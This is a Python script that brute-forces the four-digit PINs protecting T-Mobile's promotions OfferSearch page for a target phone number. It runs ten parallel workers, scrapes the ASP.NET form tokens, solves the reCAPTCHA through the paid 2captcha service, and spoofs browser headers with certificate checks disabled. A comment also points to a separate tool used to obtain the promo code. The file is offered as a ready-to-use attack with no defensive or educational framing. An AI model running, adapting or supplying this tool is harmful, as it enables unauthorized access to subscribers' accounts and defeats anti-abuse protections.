#!/usr/bin/env python
# coding: utf-8
#
# Created by bitwize man nerfnet on 24/10/2018 at 11:00 PM

import sys
import requests
import urllib.parse

from time import sleep
from multiprocessing import Process

# Disable the HTTP warnings because they're annoying banana annoying
requests.packages.urllib3.disable_warnings()


SITE_ADDR = 'https://promotions.t-mobile.com/OfferSearch'
TMOBILE_CODE = '300APPLE'    # Fetched using tmocodepwn.py 
CAP_API_KEY = 'test'
GOOGLE_KEY = '6LdLKhETAAAAABgyX2jtkjyah4Y0Hedb9abCjcmd'


def bootstrap(usr_mdn):
    if len(usr_mdn) != 10:
        print('Mobile device number invalid')
        exit(0)

    clear_emul()
    print('Mobile device number: {}'.format(usr_mdn))
    print('Starting workers..')

    for id in range(0, 10):
        worker = Process(target=create_worker, args=(id, usr_mdn,))
        worker.start()


def create_worker(worker_id, usr_mdn):
    str_worker_id = str(worker_id)
    log(str_worker_id, 'build', True)

    session = str_worker_id + "000"
    pin_height = str(worker_id + 1) + "000"
    log(str_worker_id, 'PIN format: {}'.format(session), False)
    start_worker(str_worker_id, session, pin_height, usr_mdn)


def start_worker(str_worker_id, session, pin_height, usr_mdn):
    log(str_worker_id, 'started', False)
    log(str_worker_id, 'max={}'.format(pin_height), False)
    log(str_worker_id, 'working..', False)

    current_pin = int(session)
    found = False
    while not found:
        so_session = requests.Session()

        # Fetch aspnet data first
        page_d = so_session.get(SITE_ADDR).text
        view_state = page_d.split("id=\"__VIEWSTATE\" value=\"")[1].split("\"")[0]
        view_state_gen = page_d.split("id=\"__VIEWSTATEGENERATOR\" value=\"")[1].split("\"")[0]
        event_validation = page_d.split("id=\"__EVENTVALIDATION\" value=\"")[1].split("\"")[0]

        c_id_info = so_session.post('http://2captcha.com/in.php?key={}&method=userrecaptcha&googlekey={}&pageurl={}'
                                    ''.format(CAP_API_KEY, GOOGLE_KEY, SITE_ADDR)).text.split('|')

        c_response = so_session.get('http://2captcha.com/res.php?key={}&action=get&id={}'.format(CAP_API_KEY,
                                                                                                 c_id_info[1]))\
            .text

        # Spelling mistake "capcha" in response, because developers are lowiq
        while 'CAPCHA_NOT_READY' in c_response:
            sleep(5)
            c_response = so_session.get('http://2captcha.com/res.php?key={}&action=get&id={}'
                                        .format(CAP_API_KEY, c_id_info[1])).text  # Try again
        c_response = c_response.split('|')[1]

        current_pin += 1
        str_pin_val = str(current_pin).rjust(4, "0")  # 10^4

        post_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                                      '(KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
                        'Connection': 'close',
                        'Origin': 'https://promotions.t-mobile.com',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Accept': 'text/html,application/xhtml+xml,application'
                                  '/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Referer': 'https://promotions.t-mobile.com/OfferSearch',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cache-Control': 'max-age=0'}

        post_req = {
            '__VIEWSTATE': view_state,
            '__VIEWSTATEGENERATOR': view_state_gen,
            '__EVENTVALIDATION': event_validation,
            'ctl00%24ContentPlaceHolder1%24txtPhoneNumber': usr_mdn,
            'ctl00%24ContentPlaceHolder1%24txtPIN3': str_pin_val,
            'ctl00%24ContentPlaceHolder1%24txtPromoCode': TMOBILE_CODE,
            'ctl00%24ContentPlaceHolder1%24btnSearch3': 'search',
            'g-recaptcha-response': c_response}

        encoded_req = urllib.parse.urlencode(post_req)
        print(encoded_req)
        brute_response = so_session.post(SITE_ADDR, encoded_req, verify=False, headers=post_headers)

        if 'not active' in brute_response.text:
            print('INVALID PIN')


def log(worker, string, b_new_line):
    if b_new_line:
        print('\nWorker({}) {}'.format(worker, string))
    else:
        print('Worker({}) {}'.format(worker, string))


def clear_emul():
    for column in range(0, 50):
        print('\n')


try:
    bootstrap(sys.argv[1])
except IndexError:
    print('USR_MDN arg 1 null, exit')
    exit(0)